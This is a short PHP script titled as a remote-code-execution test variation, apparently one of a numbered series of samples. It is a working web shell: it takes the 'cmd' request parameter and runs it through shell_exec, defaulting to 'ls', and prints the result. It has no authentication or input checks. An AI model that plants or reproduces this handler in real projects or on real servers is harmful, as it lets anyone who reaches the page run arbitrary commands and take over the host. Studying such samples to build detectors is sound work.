<?php
// RCE test variation #1132
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>